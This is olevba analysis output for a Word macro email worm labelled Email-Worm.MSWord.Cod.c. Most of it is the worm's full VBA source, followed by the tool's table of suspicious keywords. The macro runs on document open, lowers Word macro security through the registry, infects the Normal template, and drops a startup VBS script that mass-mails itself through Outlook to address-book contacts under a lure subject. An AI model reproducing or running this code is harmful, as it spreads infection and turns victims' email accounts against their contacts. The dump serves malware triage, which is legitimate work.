olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Email-Worm.MSWord.Cod.c
Type: Text
-------------------------------------------------------------------------------
VBA MACRO ./Email-Worm.MSWord.Cod.c 
in file: ./Email-Worm.MSWord.Cod.c - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_open()
On Error Resume Next
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
Set AcDoc = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
Set NorTEmp = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
Set ThisDoc = ThisDocument.VBProject.VBComponents.Item(1).CodeModule
Start_line = ThisDoc.ProcStartLine("document_open", vbext_pk_Proc)
If AcDoc.countoflines <> 0 Then
Ad_Lines = AcDoc.Lines(Start_line, AcDoc.countoflines)
If InStr(Ad_Lines, ThisDoc.Lines(Start_line, 53)) = 0 Then
AcDoc.AddFromString ThisDoc.Lines(Start_line, 53)
End If
Else
AcDoc.AddFromString ThisDoc.Lines(Start_line, 53)
End If
If NorTEmp.countoflines <> 0 Then
Nt_lines = NorTEmp.Lines(Start_line, NorTEmp.countoflines)
If InStr(Nt_lines, ThisDoc.Lines(Start_line, 53)) = 0 Then
NorTEmp.AddFromString ThisDoc.Lines(Start_line, 53)
End If
Else
NorTEmp.AddFromString ThisDoc.Lines(Start_line, 53)
End If
Open "c:\windows\startm~1\progra~1\autost~1\readme.txt.vbs" For Output As #1
Print #1, "'VBS/aziz by Necronomikon[Zer0Gravity]"
Print #1, "On Error Resume Next"
Print #1, "Set ws = CreateObject(""Wscript.Shell"")"
Print #1, "Set look = ws.RegRead(""HKEY_CURRENT_USER\Software\readme\"")"
Print #1, "If (look="") Then"
Print #1, "Set fso = CreateObject(""Scripting.FileSystemObject"")"
Print #1, "fso.CopyFile Wscript.ScriptFullName, fso.GetSpecialFolder(0) & ""\readme.txt.vbs"""
Print #1, "Set out = Wscript.CreateObject(""Outlook.Application"")"
Print #1, "Set mapi = out.GetNameSpace(""MAPI"")"
Print #1, "For lists = 1 to mapi.AddressLists.Count"
Print #1, "Set lists2 = mapi.AddressLists(lists)"
Print #1, "x=1"
Print #1, "recips = lists2.AddressEntries(x)"
Print #1, "Set email = out.CreateItem(0)"
Print #1, "email.Recipients.Add(recips)"
Print #1, "email.Subject = ""Here is the Text you've asked for..."""
Print #1, "email.Body = ""Heya take a look on it...."""
Print #1, "email.Attachments.Add ""C:\WINDOWS\readme.txt.vbs"""
Print #1, "email.DeleteAfterSubmit = True"
Print #1, "email.Send"
Print #1, "Next"
Print #1, "ws.RegWrite ""HKEY_CURRENT_USER\Software\readme\", ""; (c); by; Necronomikon; [Zer0Gravity]; ""
Print #1, "ws.run ""www.coderz.net/necronomikon", 3, False; ""
Print #1, "End If"
Close #1
'aziz
'(c)by Necronomikon[Zer0Gravity]
'greets to the local vx-scene
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|CopyFile            |May copy a file                              |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Wscript.Shell       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|RegRead             |May read registry keys                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |txt.vbs             |Executable file name                         |
+----------+--------------------+---------------------------------------------+

